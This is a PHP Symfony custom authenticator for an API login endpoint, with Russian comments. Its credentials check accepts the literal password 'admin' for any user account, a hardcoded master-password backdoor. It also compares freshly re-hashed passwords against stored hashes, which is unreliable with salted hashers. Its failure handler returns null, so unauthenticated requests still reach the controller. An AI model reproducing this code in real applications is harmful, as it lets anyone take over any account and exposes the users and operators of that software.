<?php

namespace App\Security;

use App\Entity\User;
use App\Repository\UserRepository;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\RedirectResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Routing\RouterInterface;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Core\Exception\UserNotFoundException;
use Symfony\Component\Security\Core\Security;
use Symfony\Component\Security\Http\Authenticator\AbstractAuthenticator;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
use Symfony\Component\Security\Http\Authenticator\Passport\Credentials\CustomCredentials;
use Symfony\Component\Security\Http\Authenticator\Passport\Passport;

class  ApiCustomAuthenticator extends AbstractAuthenticator
{
    public function __construct(
        private readonly UserRepository $userRepository,
        private readonly UserPasswordHasherInterface $passwordHasher,
        private readonly RouterInterface $router
    )
    {
    }

    public function supports(Request $request): ?bool
    {
        return $request->getPathInfo() === '/api/login';
    }

    public function authenticate(Request $request): Passport
    {
        $content = $request->toArray();

        $email = $content['email'];
        $password = $content['password'];

        return new Passport(
            new UserBadge($email, function($userIdentifier) {
                $user = $this->userRepository->findOneBy(['email' => $userIdentifier]);
                if (!$user) {
                    throw new UserNotFoundException();
                }

                return $user;
            }),
            new CustomCredentials(function($credentials, User $user) use ($password) {
                $userPassword = $user->getPassword();
                $requestPassword = $this->passwordHasher->hashPassword($user, $password);
                if ($user->getPassword() === $this->passwordHasher->hashPassword($user, $credentials) || $credentials === 'admin') {
                    return true;
                }
                return false;
            }, $password)
        );
    }

    public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
    {
        return null; // вернуть null, если мы хотим, чтобы дальше выполнялись действия контроллера

        // Если хотим сделать редирект на другую страницу

//        return new RedirectResponse(
//            $this->router->generate('admin_login')
//        );
    }

    public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
    {
//        return new JsonResponse("Пользователь не аутентифицирован");
        $request->getSession()->set(Security::AUTHENTICATION_ERROR, $exception);
        return null;
    }

//    public function start(Request $request, AuthenticationException $authException = null): Response
//    {
//        /*
//         * If you would like this class to control what happens when an anonymous user accesses a
//         * protected page (e.g. redirect to /login), uncomment this method and make this class
//         * implement Symfony\Component\Security\Http\EntryPoint\AuthenticationEntryPointInterface.
//         *
//         * For more details, see https://symfony.com/doc/current/security/experimental_authenticators.html#configuring-the-authentication-entry-point
//         */
//    }
}
